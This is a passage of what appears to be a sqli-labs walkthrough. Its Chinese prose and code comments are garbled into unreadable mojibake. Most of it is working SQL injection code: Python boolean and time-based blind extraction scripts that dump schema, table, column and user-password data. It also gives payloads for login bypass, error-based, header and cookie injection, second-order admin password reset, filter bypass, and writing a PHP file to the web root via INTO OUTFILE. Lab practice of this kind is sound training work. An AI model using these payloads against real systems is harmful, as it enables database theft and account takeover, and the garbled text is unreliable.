        # id = "0')) or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        # çˆ†å­—æ®µ
        id = "0')) or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        tmp_url = url + "?id=" + id
        start = time.time()
        resp = requests.get(tmp_url)
        end = time.time()
        if end - start > 0.1:
            flag += s
            # å½“ç›²æ³¨å‡ºæ­£ç¡®å­—ç¬¦æ—¶ï¼Œæ‰å»ç›²æ³¨ä¸‹ä¸€ä½(å˜é‡içš„ä½œç”¨)
            i += 1
            print(f"[#]------result: {flag}")
            break
        elif end - start > 5:
            print("è·‘äº†è¿™ä¹ˆä¹…ï¼Œè·‘å®Œäº†å—ï¼Ÿè·‘å®Œæˆ‘ç»™ä½ åœäº†ğŸ¤“ğŸ‘")
            exit()
        else:
            pass
```

## Less-8

### å¸ƒå°”ç›²æ³¨

çœ‹æºç é‡Œç‰¹åˆ«çš„ä¸€å¥ï¼Œæ³¨é‡Šæ‰äº†mysqlæŠ›å‡ºé”™è¯¯çš„ä»£ç è¯­å¥ï¼Œè¿™é¢˜ä¸èƒ½å†ä½¿ç”¨æŠ¥é”™æ³¨å…¥

```php
//print_r(mysql_error());
```

![18](/medias/sqli-labs/18.png)


é€šè¿‡ä¼ å…¥å‚æ•°`?id=1' or 1=1%23`ã€`?id=1" or 1=1%23`ï¼Œåœ¨`?id=1'or 1=1%23`æ—¶é¡µé¢æ­£å¸¸ï¼Œè¿˜æ˜¯å•å¼•å·åŒ…è£¹çš„`id`

å¸ƒå°”ç›²æ³¨

```python
import requests
import string
import time
# ä¸‹åˆ’çº¿æ”¾æœ€åï¼Œé¿å…å½“ä½œç»Ÿé…ç¬¦åƒæ‰ç‰¹æ®Šå­—ç¬¦
flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
flag = ""

url = "http://127.0.0.1:8080/Less-8/"
i = 1
print("è„šæœ¬æ­£åœ¨è¿è¡Œ.......")
while True:
    
    for s in flags:
        # çˆ†åº“
        id = "0' or left((select group_concat(schema_name) from information_schema.schemata)," + str(i)+")='"+ flag + s+"'%23"
        # çˆ†è¡¨
        # id = "0' or left((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+")='"+ flag + s +"'%23"
        # çˆ†å­—æ®µ
        # id = "0' or left((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+")='"+ flag + s +"'%23"
        tmp_url = url + "?id=" + id
        resp = requests.get(tmp_url)
        
        if "You are in" in resp.text:
            flag += s
            i += 1
            # æœ€åä¸€æ¬¡æˆåŠŸæ‹¼æ¥ä½œä¸ºå¼€å§‹ï¼Œåˆ¤æ–­è¶…æ—¶
            start = time.time()
            print(f"[#]------{flag}")
            break
        else:
            pass
    end = time.time()
    # ç›®æ ‡æœåŠ¡å™¨æ€§èƒ½å¯èƒ½å­˜åœ¨å·®è·ï¼Œé€‚å½“è°ƒæ•´è¶…æ—¶æ—¶é—´
    try:
        if end - start > 1.5:
            if flag != "":
                print("ç›²æ³¨ç»“æŸï¼Œæ£€æŸ¥flagæ˜¯å¦æ˜¯é¢„æœŸç»“æœï¼")
            else:
                print("æ£€æµ‹åˆ°é•¿æ—¶é—´æ²¡æœ‰å†è·å–åˆ°å“åº”ï¼Œè¯¥è„šæœ¬å¸ƒå°”ç›²æ³¨å¯èƒ½å¹¶ä¸é€‚é…é€€å‡º")
            exit()  
    except NameError:
        print("åœ¨ç¬¬ä¸€è½®å¾ªç¯ä¸­æœªæ‰¾åˆ°åˆé€‚çš„å¼€å§‹å­—ç¬¦ï¼Œæ£€æŸ¥ç¯å¢ƒæ˜¯å¦é€‚åˆå¸ƒå°”ç›²æ³¨æˆ–æ‰©å……flagså˜é‡(å¯èƒ½å‡ºç°çš„å­—ç¬¦")
        exit()
```


![19](/medias/sqli-labs/19.png)

### æ—¶é—´ç›²æ³¨

```python
import requests
import string
import time
# ä¸‹åˆ’çº¿æ”¾æœ€åï¼Œé¿å…å½“ä½œç»Ÿé…ç¬¦åƒæ‰ç‰¹æ®Šå­—ç¬¦
flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
flag = ""

url = "http://127.0.0.1:8080/Less-8/"
i = 1
print("è„šæœ¬æ­£åœ¨è¿è¡Œ.......")
while True:
    
    for s in flags:
        # çˆ†åº“
        # id = "0' or if((substr((select group_concat(schema_name) from information_schema.schemata)," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        # çˆ†è¡¨
        # id = "0' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        # çˆ†å­—æ®µ
        id = "0' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        tmp_url = url + "?id=" + id
        start = time.time()
        resp = requests.get(tmp_url)
        end = time.time()
        if end - start > 0.1:
            flag += s
            # å½“ç›²æ³¨å‡ºæ­£ç¡®å­—ç¬¦æ—¶ï¼Œæ‰å»ç›²æ³¨ä¸‹ä¸€ä½(å˜é‡içš„ä½œç”¨)
            i += 1
            print(f"[#]------result: {flag}")
            break
        elif end - start > 2:
            print("è·‘äº†è¿™ä¹ˆä¹…ï¼Œè·‘å®Œäº†å—ï¼Ÿè·‘å®Œæˆ‘ç»™ä½ åœäº†ğŸ¤“ğŸ‘")
            exit()
        else:
            pass
```


## Less-9

æ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œé¡µé¢åªæœ‰`You are in...........`ï¼Œåªèƒ½ç”¨æ—¶é—´ç›²æ³¨äº†

åœ¨ä¼ å…¥`?id=0' or if(1=1,sleep(5),sleep(5))`æ—¶ï¼Œé¡µé¢é•¿æ—¶é—´åŠ è½½ï¼Œè¯´æ˜å­˜åœ¨æ—¶é—´ç›²æ³¨

ä¸Šé¢˜è„šæœ¬ï¼Œç¨åŠ ä¿®æ”¹è¿˜èƒ½ç”¨

## Less-10

åŸºäºæ—¶é—´ç›²æ³¨çš„åŒå¼•å·ç±»å‹å‚æ•°

ä¸Šé¢æ—¶é—´ç›²æ³¨è„šæœ¬è¿˜èƒ½æ¢­å“ˆ


## Less-11

è¿™é‡Œå¼€å§‹ä½¿ç”¨postå‚æ•°ï¼Œé€šè¿‡æµ‹è¯•ï¼Œå¯ä»¥çŒœæµ‹åå°ä½¿ç”¨çš„å•å¼•å·åŒ…è£¹çš„å‚æ•°ï¼Œåœ¨ç”¨æˆ·åæˆ–å¯†ç å‡ºéƒ½å¯ä»¥å°è¯•ä½¿ç”¨ä¸‡èƒ½å¯†ç 

![21](/medias/sqli-labs/21.png)

![20](/medias/sqli-labs/20.png)


åœ¨åå°ï¼Œsqlè¯­å¥å¯èƒ½æ˜¯è¿™æ ·çš„

```sql
$sql = "select * from users where username = '$username' and password = '$password'";
```


ç”¨æˆ·åå’Œå¯†ç æ˜¯`and`è¿æ¥çš„ï¼Œæ‹¼æ¥orä»¥åï¼ŒåŒæ—¶å­˜åœ¨`or`å’Œ`and`ï¼Œä¼šæ€ä¹ˆå¤„ç†ï¼Ÿ`and`çš„ä¼˜å…ˆçº§æ›´é«˜ï¼Œä¼šå…ˆæ‰§è¡Œ`and`ï¼Œå†æ‰§è¡Œ`or`


- å¦‚æœåœ¨ç”¨æˆ·åå¤„åšæ–‡ç« ï¼Œå¯ä»¥æŠŠåé¢çš„andæ³¨é‡Šæ‰ï¼Œä¸å†è€ƒè™‘ã€‚æˆ‘ä»¬æ‹¼æ¥åå¾—åˆ°çš„sqlè¯­å¥å¯èƒ½æ˜¯è¿™æ ·çš„ï¼Œä¸éœ€è¦è€ƒè™‘ç”¨æˆ·åå¯†ç æ˜¯ä»€ä¹ˆ
```sql
select * from users where username = 'admin' or 1=1 # and password = '123456';
```

- å¦‚æœä»å¯†ç å…¥æ‰‹ï¼Œå¯ä»¥å°è¯•åœ¨å¯†ç å¤„æ‹¼æ¥`or 1=1`ï¼Œè¿™æ ·å¯†ç æ°¸è¿œä¸ºçœŸï¼Œsqlè¯­å¥å¯èƒ½æ˜¯è¿™æ ·çš„ï¼Œå³ä½¿ç”¨æˆ·åå¯†ç `and`ç»“æœæ˜¯`false`ï¼Œåœ¨`or 1=1`çš„ä½œç”¨ä¸‹ï¼Œsqlè¯­å¥æ°¸è¿œä¸ºçœŸ

```sql
select * from users where username = 'admin' and password = '123456' or 1=1;
```

![22](/medias/sqli-labs/22.png)

è¿™é‡Œå›æ˜¾ç”¨æˆ·åå¯†ç çš„é€»è¾‘æœ‰ç‚¹æ€ªï¼Œç”Ÿäº§ç¯å¢ƒåº”è¯¥....åº”è¯¥ç”¨ ç›²æ³¨ã€å†™é©¬â˜ğŸ¤“

## Less-12

ç”¨æˆ·åå¸¦`"`åŒå¼•å·æ—¶ï¼ŒsqlæŠ¥é”™ï¼Œçˆ†å‡ºäº†ä¸€éƒ¨åˆ†sqlè¯­å¥ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯ç”¨`("")`åŒ…è£¹çš„å‚æ•°

çŒœæµ‹åå°sqlè¯­å¥

```sql
$username = '"'.$_POST['username'].'"';
$password = '"'.$_POST['password'].'"';
$sql = "select * from users where username = ($username) and password = ($password)";
```

é—­åˆåŒå¼•å·æ‹¬å·ï¼Œé¢˜å‰ç»“æŸsqlè¯­å¥ï¼Œå®ŒæˆéªŒè¯

```sql
select * from users where username = ("1") or 1=1#") and password = ("123456");
```

![24](/medias/sqli-labs/24.png)

## Less-13

ç±»ä¼¼ä¸Šä¸€å…³ï¼ŒåŒºåˆ«ï¼šä½¿ç”¨`1')#`é—­åˆå•å¼•å·ã€æ‹¬å·åæ²¡æœ‰å›æ˜¾äº†ï¼Œè¿™æ‰åƒæ­£å¸¸ç™»å½•é€»è¾‘

æ—¶é—´ç›²æ³¨

```python
import requests
import string
import time
# ä¸‹åˆ’çº¿æ”¾æœ€åï¼Œé¿å…å½“ä½œç»Ÿé…ç¬¦åƒæ‰ç‰¹æ®Šå­—ç¬¦
flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
flag = ""

url = "http://127.0.0.1:8080/Less-13/"
i = 1
print("è„šæœ¬æ­£åœ¨è¿è¡Œ.......")
while True:
    
    for s in flags:
        data = {
            "uname" : "1",
            "passwd" : "1", 
            "submit" : "Submit"
        }
        # çˆ†åº“
        # data['uname'] = "1') or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
        # çˆ†è¡¨
        data['uname'] = "1') or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
        # çˆ†å­—æ®µ
        # data['uname'] = "1') or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
        
        start = time.time()
        resp = requests.post(url,data=data)
        # print(data['uname'])
        # print(resp.text)
        # exit()
        end = time.time()
        if end - start > 0.1:
            flag += s
            # å½“ç›²æ³¨å‡ºæ­£ç¡®å­—ç¬¦æ—¶ï¼Œæ‰å»ç›²æ³¨ä¸‹ä¸€ä½(å˜é‡içš„ä½œç”¨)
            i += 1
            print(f"[#]------result: {flag}")
            break
        elif end - start > 2:
            print("è·‘äº†è¿™ä¹ˆä¹…ï¼Œè·‘å®Œäº†å—ï¼Ÿè·‘å®Œæˆ‘ç»™ä½ åœäº†ğŸ¤“ğŸ‘")
            exit()
        else:
            pass
```

![25](/medias/sqli-labs/25.png)

## Less-14

åœ¨è¿™é‡Œçªç„¶å‘ç°ä¼šæŠ¥é”™ï¼Œè¯•è¯•æŠ¥é”™æ³¨å…¥

`updatexml`ã€`extractvalue`å‡½æ•°éƒ½å¯ä»¥æ­£å¸¸æŠ¥é”™æ³¨å…¥

```sql
uname=0' or extractvalue(1,concat(0x7e,database(),0x7e))#
```

![26](/medias/sqli-labs/26.png)

`mysql_error()`æ”¾å‡ºæ¥äº†ï¼Ÿé‚£ä¸Šé¢å‡ é¢˜æ˜¯ä¸æ˜¯ä¹Ÿèƒ½æŠ¥é”™æ³¨å…¥ï¼Ÿæˆ‘å»è¯•è¯•â˜ğŸ¤“

![27](/medias/sqli-labs/27.png)

## Less-15

æˆ‘æµ‹ï¼Œè¿™é‡Œä»€ä¹ˆæç¤ºã€å›æ˜¾éƒ½æ²¡æœ‰ï¼ŒæŠ¥é”™ä¹Ÿæ²¡æœ‰ã€‚è¯•è¯•æ—¶é—´ç›²æ³¨

åœ¨ä¼ å…¥è¿™ä¸ªpayloadæ—¶ï¼Œé¡µé¢é•¿æ—¶é—´åŠ è½½ï¼Œè¯´æ˜å­˜åœ¨æ—¶é—´ç›²æ³¨ï¼Œè¯­æ³•ä¹Ÿå¯¹ä¸Šäº†

```sql
passwd=1&submit=Submit&uname=1' or if(1=1,sleep(5),sleep(5))#
```

æˆ‘å…¥

::: details
```python
import requests
import string
import time
# ä¸‹åˆ’çº¿æ”¾æœ€åï¼Œé¿å…å½“ä½œç»Ÿé…ç¬¦åƒæ‰ç‰¹æ®Šå­—ç¬¦
flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
flag = ""

url = "http://127.0.0.1:8080/Less-15/"
i = 1
print("è„šæœ¬æ­£åœ¨è¿è¡Œ.......")
while True:
    
    for s in flags:
        data = {
            "uname" : "1",
            "passwd" : "1", 
            "submit" : "Submit"
        }
        # çˆ†åº“
        # data['uname'] = "1' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
        # çˆ†è¡¨
        # data['uname'] = "1' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
        # çˆ†å­—æ®µ
        data['uname'] = "1' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
        # çˆ†æ•°æ®
        # data['uname'] = "1' or if((substr((select group_concat(username,password) from users)," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
        start = time.time()
        resp = requests.post(url,data=data)
        # print(data['uname'])
        # print(resp.text)
        # exit()
        end = time.time()
        if end - start > 0.1:
            flag += s
            # å½“ç›²æ³¨å‡ºæ­£ç¡®å­—ç¬¦æ—¶ï¼Œæ‰å»ç›²æ³¨ä¸‹ä¸€ä½(å˜é‡içš„ä½œç”¨)
            i += 1
            print(f"[#]------result: {flag}")
            break
        elif end - start > 2:
            print("è·‘äº†è¿™ä¹ˆä¹…ï¼Œè·‘å®Œäº†å—ï¼Ÿè·‘å®Œæˆ‘ç»™ä½ åœäº†ğŸ¤“ğŸ‘")
            exit()
        else:
            pass
```
:::

## Less-16

åœ¨å°è¯•è¿™ä¸ªpayloadæ—¶ï¼Œé¡µé¢è¿›å…¥é•¿æ—¶é—´åŠ è½½çŠ¶æ€ï¼Œè¯´æ˜å­˜åœ¨æ—¶é—´ç›²æ³¨

![28](/medias/sqli-labs/28.png)

```sql
passwd=1&submit=Submit&uname=1") or if(1=1,sleep(5),sleep(5))#
```


## Less-17 updateæ¨¡å—

è¿™é‡Œï¼Œéœ€è¦ä¸€ä¸ªç”¨æˆ·åå’Œä¸€ä¸ªæ–°å¯†ç ï¼ŒçŒœæµ‹åå°sqlè¯­å¥ç±»ä¼¼

```php
$uname = $_POST['uname'];
$passwd = $_POST['passwd'];
$sql = "update users set password = '$passwd' where username = '$uname'";
```

ä¼ å…¥å•å¼•å·å‚æ•°`passwd`ï¼Œé¡µé¢æŠ¥é”™

![29](/medias/sqli-labs/29.png)

è¿™é‡Œä¸ºä»€ä¹ˆç”¨æˆ·åä¸èƒ½æ³¨å…¥ï¼Ÿç¿»çœ‹æºç 

![30](/medias/sqli-labs/30.png)

å¥½å¥½å¥½ï¼Œè¿™ä¹ˆç©

é‚£å°±ä»å‚æ•°`passwd`å…¥æ‰‹ï¼Œé¡µé¢ä¼šæŠ¥é”™ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥

```sql
passwd=1' or updatexml(1,concat(0x7e,user(),0x7e),1)#&submit=Submit&uname=0
```

![31](/medias/sqli-labs/31.png)

## Less-18 HTTP Header

ç¿»çœ‹æºç å­¦ä¹ ä¸€ä¸‹,`uname`ã€`passwd`å‚æ•°éƒ½åšäº†æ£€æŸ¥ï¼Œå¦å¤–ï¼Œä½¿ç”¨`insert`è¯­å¥ï¼ŒæŠŠç”¨æˆ·çš„`ip`ã€`user-agent`æ’å…¥åˆ°ä¸€ä¸ª`security.uagents`è¡¨é‡Œ

![32](/medias/sqli-labs/32.png)

![33](/medias/sqli-labs/33.png)


è¿™é‡Œæ²¡æœ‰åšè¿‡æ»¤ï¼Œç›´æ¥æŠŠç”¨æˆ·httpæŠ¥å¤´å­—æ®µæ’å…¥è¡¨é‡Œ
```php
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```

æ’å…¥çš„è¯­å¥ä¸€èˆ¬æ˜¯æˆåŠŸæ’å…¥ä¸€æ¡è¯­å¥ï¼Œæ²¡ä»€ä¹ˆå›æ˜¾ï¼Œç»§ç»­å¾€ä¸‹è¯»æºç å‘ç°`print_r(mysql_error());`ï¼ŒæŠ›å‡ºé”™è¯¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨æŠ¥é”™æ³¨å…¥

æœ‰ä¸ªå°¿ç‚¹ï¼Œè¿™é‡Œå¦‚æœç”¨æˆ·ä¸å­˜åœ¨ï¼Œé‚£ä¹Ÿå°±ä¸ä¼šè¿›å…¥ä¿å­˜ç”¨æˆ·çš„`ip`ã€`ua`é˜¶æ®µï¼Œä¹Ÿæ²¡åŠæ³•åˆ©ç”¨æŠ¥é”™æ³¨å…¥

è¿™é‡Œä½¿ç”¨`hackbar`æ¼”ç¤ºï¼Œå…ˆæäº¤ä¸€æ¬¡ç”¨æˆ·åï¼Œå¯†ç ã€‚ç”¨æˆ·éœ€è¦æ˜¯å­˜åœ¨çš„ï¼Œä½¿ç”¨`admin`ç”¨æˆ·ï¼Œå¯†ç éšæ„

åœ¨hackbarè·å–æ•°æ®åŒ…ï¼Œä¿®æ”¹`User-Agent`å­—æ®µï¼Œæµ‹è¯•å•å¼•å·ï¼Œé¡µé¢æŠ¥é”™ï¼Œå°è¯•é—­åˆè¯­å¥

![34](/medias/sqli-labs/34.png)


çœ‹åˆ°`ua`å­—æ®µåé¢çˆ†å‡ºäº†`ip`ã€`uname`ï¼Œä»¥åŠä¸€ä¸ªå³æ‹¬å·`)`

æ‰€ä»¥å¯ä»¥å°è¯•é—­åˆï¼Œæ³¨é‡Šæ‰åé¢åŸæœ‰å†…å®¹

```sql
a',1,2)#
```

æ²¡æœ‰è¯­æ³•é”™è¯¯ï¼Œé¡µé¢æ­£å¸¸ï¼Œæ²¡æœ‰è¯­æ³•é”™è¯¯ï¼Œå¯ä»¥å°è¯•æŠ¥é”™æ³¨å…¥äº†

![35](/medias/sqli-labs/35.png)

```sql
a',1,updatexml(1,concat(0x7e,user(),0x7e),1))#
```

![36](/medias/sqli-labs/36.png)


## Less-19

å°è¯•åœ¨`referer`å­—æ®µæ³¨å…¥

![37](/medias/sqli-labs/37.png)

åœ¨æŠ¥é”™è¯­å¥é‡Œå¯ä»¥çœ‹åˆ°`192.168.6.148')`ï¼Œè¯´æ˜`referer`å­—æ®µåé¢è¿˜æœ‰ä¸€ä¸ªå­—æ®µæ‰è¿›è¡Œé—­åˆ

å°è¯•è¡¥å……å­—æ®µã€é—­åˆè¯­å¥ã€æ³¨é‡Šåé¢

```sql
http://192.168.6.246:8080/Less-19/',1,updatexml(1,concat(0x7e,user(),0x7e),1))#
```

![38](/medias/sqli-labs/38.png)


## Less-19

åœ¨å°è¯•`admin`ç”¨æˆ·ç™»å½•åï¼ŒåŠ è½½æ•°æ®åŒ…ï¼Œå°è¯•ä¿®æ”¹`referer`ã€`user-agent`ã€`cookie`å­—æ®µ

åœ¨`cookie`å­—æ®µä¼ å…¥å•å¼•å·æ—¶ï¼Œé¡µé¢æŠ¥é”™`'admin'' LIMIT 0,1`ï¼Œå¤šå‡ºä¸€ä¸ªå•å¼•å·

é—­åˆï¼Œåœ¨`cookie`å­—æ®µæŠ¥é”™æ³¨å…¥

```sql
uname=admin' or updatexml(1,concat(0x7e,user(),0x7e),1)#
```

## Less-20

åœ¨cookieé‡Œä¼ å…¥å•å¼•å·ï¼Œé¡µé¢æŠ¥é”™ï¼Œå¯ä»¥çœ‹åˆ°çˆ†å‡ºçš„ååŠå¥sqlè¯­å¥

![39](/medias/sqli-labs/39.png)

```sql
'admin'' LIMIT 0,1
```

cookieé‡Œ`uname`å­—æ®µä½¿ç”¨ä¸å­˜åœ¨çš„ç”¨æˆ·åï¼Œå¯ä»¥åˆ©ç”¨è”åˆæŸ¥è¯¢ï¼Œå­˜åœ¨å›æ˜¾ä½ï¼Œ`order by 4`å¯ä»¥æµ‹è¯•å‡ºæŸ¥è¯¢å­—æ®µé•¿åº¦ä¸º3

```sql
uname=a' union select 11,22,33#
```

![40](/medias/sqli-labs/40.png)




## Less-21

ç™»å½•åï¼ŒåŠ è½½æ•°æ®åŒ…`cookie: uname=YWRtaW4%3D`

åé¢çœ‹ä¸å‡ºæ˜¯ä»€ä¹ˆæ•°æ®ï¼Œç«Ÿç„¶æ˜¯base64ç¼–ç ï¼Œè§£ç åæ˜¯`admin`

ä¼ å…¥ä¸€ä¸ª`admin'`ï¼Œbase64ç¼–ç åå‘åŒ…ï¼Œé¡µé¢æŠ¥é”™

![41](/medias/sqli-labs/41.png)

```sql
'admin'') LIMIT 0,1
```

é—­åˆå•å¼•å·ã€æ‹¬å·ï¼Œä½¿ç”¨è”åˆæŸ¥è¯¢ï¼Œunameå€¼è¿›è¡Œbase64ç¼–ç 

```sql
uname=a') union select 11,22,33#
```

![42](/medias/sqli-labs/42.png)


å°è¯•å†™å…¥æ–‡ä»¶ï¼Œè¿™é‡Œphpæ–‡ä»¶å†…å®¹ä½¿ç”¨16è¿›åˆ¶ç¼–ç 

```sql
uname=a') union select 11,22,0x3c3f3d706870696e666f28293b3f3e into outfile '/var/www/html/Less-21/4.php'#
```

![43](/medias/sqli-labs/43.png)


## Less-22

åŒä¸Šä¸€å…³ï¼Œå•å¼•å·æ¢ä¸ºåŒå¼•å·ç±»å‹äº†ï¼Œæ²¡æœ‰æ‹¬å·åŒ…è£¹

```sql
uname=a" union select 11,22,0x3c3f3d706870696e666f28293b3f3e into outfile '/var/www/html/Less-22/1.php'#
```


## Less-23

ä¸€ç›´ç»•è¿‡ä¸å»ï¼Œçœ‹çœ‹æºç ï¼ŒæŠŠåŸæ¥ç”¨æ¥æ³¨é‡Šæ‰åé¢å†…å®¹çš„æ³¨é‡Šç¬¦ç»™è¿‡æ»¤æ‰äº†

![44](/medias/sqli-labs/44.png)

ç°åœ¨ä¹Ÿå¯ä»¥sqlæ³¨å…¥ï¼Œpayloadæœ€åç•™ä¸ªå•å¼•å·é—­åˆåŸæœ‰çš„å•å¼•å·å°±å¯ä»¥äº†

```sql
?id=a' or 1='1
```

![45](/medias/sqli-labs/45.png)

è¿™é‡Œä¸èƒ½ä½¿ç”¨order byæµ‹å­—æ®µä¸ªæ•°äº†

```sql
?id=0' union select 1,2,3,'4
```

![46](/medias/sqli-labs/46.png)

![47](/medias/sqli-labs/47.png)

å¥—ä¸ªå­æŸ¥è¯¢æ‹¿æ•°æ®

```sql
?id=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),'3
```

![48](/medias/sqli-labs/48.png)

## Less-24

æŸ¥çœ‹é¢˜ç›®æºç ï¼Œæ³¨å†ŒåŠŸèƒ½ä¸Šæ²¡æœ‰sqlæ³¨å…¥ï¼Œå³æ˜¯æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œä¹Ÿä¼šè½¬ä¹‰

```php
$username=  mysql_escape_string($_POST['username']) ;
$pass= mysql_escape_string($_POST['password']);
$re_pass= mysql_escape_string($_POST['re_password']);
$sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";
```

åœ¨å¯†ç ä¿®æ”¹åŠŸèƒ½ä¸Šä¹Ÿä½¿ç”¨äº†è½¬ä¹‰ï¼Œ

```php
$username= $_SESSION["username"];
$curr_pass= mysql_real_escape_string($_POST['current_password']);
$pass= mysql_real_escape_string($_POST['password']);
$re_pass= mysql_real_escape_string($_POST['re_password']);
$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
```

å¯ä»¥é€šè¿‡æ³¨å†Œä¸€ä¸ª`admin'#`ç”¨æˆ·ï¼Œè™½ç„¶å­—ç¬¦è¢«è½¬ä¹‰äº†åˆ©ç”¨ä¸äº†ï¼Œä½†æ˜¯å¯ä»¥åœ¨å¯†ç ä¿®æ”¹åŠŸèƒ½é‡Œï¼Œç”¨æˆ·åæ²¡æœ‰ä½¿ç”¨è½¬ä¹‰ï¼Œæ‹¼æ¥è¿›å»æ—¶å¯ä»¥ç›´æ¥åˆ©ç”¨


æ€è·¯ï¼šæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç”¨æˆ·åä½¿ç”¨`admin'#`ï¼Œå¯†ç éšæ„ï¼Œåœ¨å¯†ç ä¿®æ”¹æ—¶ï¼Œåˆ©ç”¨sqlè¯­å¥æ¼æ´æ¥ä¿®æ”¹ç”¨æˆ·`admin`çš„å¯†ç 


ç”¨æˆ·`admin'#`åœ¨ä¿®æ”¹å¯†ç æ—¶ï¼Œsqlè¯­å¥å˜æˆ

```sql
UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass' 
```

é€šè¿‡ä¿®æ”¹ç”¨æˆ·`admin'#`çš„å¯†ç ï¼Œæ¥ä¿®æ”¹ç”¨æˆ·`admin`çš„å¯†ç 


![49](/medias/sqli-labs/49.png)

## Less-25

```php
$id= preg_replace('/or/i',"", $id);
$id= preg_replace('/AND/i',"", $id);
```

æŸ¥çœ‹æºç ï¼Œé¢˜ç›®è¿‡æ»¤äº†`or`ã€`adn`ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æµ‹è¯•çš„æŠ¥é”™è¯­å¥çŒœæµ‹è¿‡æ»¤é»‘åå•


- ä¼ å…¥`?id=1'`ï¼ŒæŠ¥é”™ï¼š`'1'' LIMIT 0,1`
- ä¼ å…¥`?id=1'#`ï¼Œä¸æŠ¥é”™
- ä¼ å…¥`?id=1' or 1=1#`ï¼ŒæŠ¥é”™ï¼š`1=1#' LIMIT 0,1`

åé¢çš„æ³¨é‡Šè‚¯å®šæ˜¯ç”Ÿæ•ˆçš„ï¼Œä¸ä¼šå› ä¸ºåé¢çš„è¯­å¥æŠ¥é”™

æ²¡æœ‰ä»`1'`å¼€å§‹æŠ¥é”™ï¼Œè¯´æ˜`1'`ä¹ŸæˆåŠŸé—­åˆäº†

æ²¡æœ‰å›æ˜¾`1'`åçš„`or`ï¼Œç›´æ¥å›æ˜¾äº†`1=1#`ï¼Œè¯´æ˜`or`è¢«æ›¿æ¢ä¸ºç©ºäº†

å°è¯•åŒå†™ï¼Œé‡Œä¸€å±‚å¤–ä¸€å±‚ï¼Œåœ¨åŒ¹é…åˆ°é‡Œé¢ä¸€å±‚å¹¶æ›¿æ¢ä¸ºç©ºæ—¶ï¼Œå¤–é¢ä¸€å±‚oræˆä¸ºæ–°çš„orï¼Œä¹Ÿå¯ä»¥é€‚ç”¨åˆ°å…¶ä»–å…³é”®å­—è¢«ä¸€æ¬¡è¿‡æ»¤æ—¶

```sql
oorr  >  or
selselectect  >  select  # åœ¨ä¸€ä¸ªselecté‡Œçš„ä»»æ„ä½ç½®å†å†™ä¸€ä¸ªselect
```

è¿™é¢˜å¯ä»¥ç›´æ¥è”åˆæŸ¥è¯¢

```sql
?id=0' union select 1,2,3%23
```

![50](/medias/sqli-labs/50.png)

è€ƒå¯ŸåŒå†™ç»•è¿‡

```sql
?id=0' oorr updatexml(1,concat(0x7e,user(),0x7e),1)%23
```

![51](/medias/sqli-labs/51.png)


## Less-25a

æ•´å‹æ³¨å…¥ï¼Œè¿‡æ»¤äº†`or`ã€`and`

æµ‹è¯•å‘ç°å•åŒå¼•å·ä¸ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™æ³¨å…¥ä¸å¯è¡Œï¼Œå¯ä»¥ä½¿ç”¨è”åˆæŸ¥è¯¢ï¼Œæµ‹è¯•è¿‡ç¨‹

```sql
?id=0 union select 1,2,3#
```

é¢˜ç›®åç§°æç¤ºä½¿ç”¨`or`ã€`and`ç›²æ³¨ï¼Œå†™ä¸ªè„šæœ¬è¯•è¯•


```python
import requests
import string
import time
# ä¸‹åˆ’çº¿æ”¾æœ€åï¼Œé¿å…å½“ä½œç»Ÿé…ç¬¦åƒæ‰ç‰¹æ®Šå­—ç¬¦
flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
flag = ""

url = "http://127.0.0.1:8080/Less-25a/"
i = 1
print("è„šæœ¬æ­£åœ¨è¿è¡Œ.......")
while True:
    
    for s in flags:
        # çˆ†åº“
        id = "0 oorr if((substr((select group_concat(schema_name) from infoorrmation_schema.schemata)," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        # çˆ†è¡¨
        # id = "0 oorr if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        # çˆ†å­—æ®µ
